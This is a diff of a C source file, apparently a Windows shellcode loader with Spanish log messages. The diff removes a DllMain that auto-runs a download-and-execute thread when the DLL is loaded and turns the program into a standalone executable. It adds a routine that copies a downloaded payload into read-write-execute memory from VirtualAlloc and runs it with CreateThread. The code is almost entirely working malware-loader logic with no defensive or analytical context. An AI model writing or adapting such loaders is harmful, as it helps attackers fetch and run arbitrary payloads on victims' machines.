@@ -11,33 +11,6 @@
 #define BUFFER_SIZE 4096
 
 
-// DECLARACIONES ANTICIPADAS
-void* DownloaderThread(size_t *payload_size);
-void Run(void* payload, size_t payload_size);
-
-
-BOOL isLoaded = FALSE;
-
-DWORD WINAPI SafeStartupThread(LPVOID param)
-{
-    if (!isLoaded)
-    {
-        isLoaded = TRUE;
-        printf("[Dll] SafeStartupThread");
-
-
-        size_t payload_size;
-        void* payload = DownloaderThread(&payload_size);
-        printf("[+] Payload size: %d, en la direccion %p\n", payload_size, payload);
-
-        Run(payload, payload_size);
-
-    }
-
-    return 0;
-}
-
-
 void* DownloaderThread(size_t *payload_size) {
     
     printf("[+] DownloaderThread iniciado\n");
@@ -164,6 +137,19 @@ cleanup:
     return 0;
 }
 
+void RunWithAlloc(void* payload, size_t payload_size){
+
+    printf("[+] RunWithAlloc \n");
+
+    LPVOID mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    if (mem) {
+        memcpy(mem, payload, payload_size);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    }
+    
+}
+
 void Run(void* payload, size_t payload_size){
     printf("[+] RunWithProtect \n");
 
@@ -180,23 +166,17 @@ void Run(void* payload, size_t payload_size){
     }
 }
 
+int main(){
+    printf("[+] Start \n");
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    size_t payload_size;
+    void* payload = DownloaderThread(&payload_size);
+    printf("[+] Payload size: %d, en la direccion %p\n", payload_size, payload);
 
-    switch (reason)
-    {
-        case DLL_PROCESS_ATTACH:
-        {
-            DisableThreadLibraryCalls(hModule);
+    Run(payload, payload_size);
 
-            HANDLE hThread = CreateThread(NULL, 0, SafeStartupThread, NULL, 0, NULL);
-            
-            if (hThread) {CloseHandle(hThread);}        
 
-            break;
-        }
-    }
-
-    return TRUE;
-
+    printf("[+] Pres enter to end... \n");
+    getchar();
+    return 1;
 }
